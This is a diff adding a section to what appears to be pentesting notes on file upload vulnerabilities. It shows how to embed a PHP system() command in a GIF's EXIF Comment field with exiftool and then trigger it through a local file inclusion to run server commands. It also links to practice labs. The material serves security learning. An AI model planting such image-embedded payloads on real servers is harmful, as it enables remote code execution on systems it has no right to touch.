@@ -362,6 +362,27 @@ This is like a mix of some uploads labs
 
 ---
 
+# Extra information
+
+You can play with **metadata** of some GIF on Internet
+
+With [ExifTool](../../Tools/Metadata/ExifTool/ExifTool.md) you can see the metadata
+
+> exiftool cat.png
+
+With exiftool you can create a new field (in Comment section)
+
+
+````php
+exiftool -Comment='<? system("whaomi"); ?>' cat.gif
+````
+
+Maintains the original image and create a new image with a section that is name Comment and have the data.
+
+If you find a [LFI](../LFI/LFI.md) and can point to this resource, you can see a lot of ilegible characters, but you can see in some part the information of the command (in this case www-data)
+
+---
+
 # Labs
 
 - https://github.com/moeinfatehi/file_upload_vulnerability_scenarios
